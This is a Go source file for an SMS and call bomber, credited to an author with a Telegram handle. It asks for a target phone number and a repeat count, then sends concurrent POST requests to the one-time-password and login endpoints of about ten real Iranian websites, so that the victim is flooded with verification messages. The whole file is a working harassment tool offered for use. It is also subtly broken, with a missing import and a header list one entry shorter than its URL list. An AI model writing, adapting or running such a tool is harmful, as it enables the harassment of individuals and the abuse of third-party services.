package main

import ( "bytes" "encoding/json" "fmt" "net/http" "os" "time" )

func clearScreen() { cmd := exec.Command("cmd", "/c", "cls").Run() if cmd != nil { exec.Command("clear").Run() } }

func sms(url string, header map[string]string) { time.Sleep(3 * time.Second) jsonData, _ := json.Marshal(header) req, _ := http.NewRequest("POST", url, bytes.NewBuffer(jsonData)) req.Header.Set("Content-Type", "application/json") client := &http.Client{} resp, err := client.Do(req) if err != nil { fmt.Println("\033[01;31m[-] Error ! ") } else { defer resp.Body.Close() if resp.StatusCode != 200 { fmt.Println("\033[01;31m[-] Error ! ") } else { fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended") } } }

func main() { clearScreen() fmt.Println("\033[01;33m") fmt.Println(` Coded By NICOLA(Telegram: @black_nicola) GitHub : mr-r0ot

 
`)
var phone string
var repeatCount int
fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone 09xxxxxxxxxx: \033[00;36m")
fmt.Scan(&phone)
fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms and call: \033[00;36m")
fmt.Scan(&repeatCount)

urls := []string{
	"https://3tex.io/api/1/users/validation/mobile",
	"https://deniizshop.com/api/v1/sessions/login_request",
	"https://flightio.com/bff/Authentication/CheckUserKey",
	"https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
	"https://bck.behtarino.com/api/v1/users/phone_verification/",
	"https://abantether.com/users/register/phone/send/",
	"https://novinbook.com/index.php?route=account/phone",
	"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=" + phone,
	"https://api.pooleno.ir/v1/auth/check-mobile",
	"https://agent.wide-app.ir/auth/token",
}

headers := []map[string]string{
	{
		"receptorPhone": phone,
	},
	{
		"mobile_phone": phone,
	},
	{
		"userKey": phone,
	},
	{
		"cellphone": phone,
	},
	{
		"phone": phone,
	},
	{
		"phoneNumber": phone,
	},
	{
		"phone": phone,
	},
	{
		"esfelurm": "esfelurm",
	},
	{
		"mobile": phone,
	},
}

for i := 0; i < repeatCount; i++ {
	for idx, url := range urls {
		go sms(url, headers[idx])
	}
}

time.Sleep(10 * time.Second) // Keep the main goroutine running

}
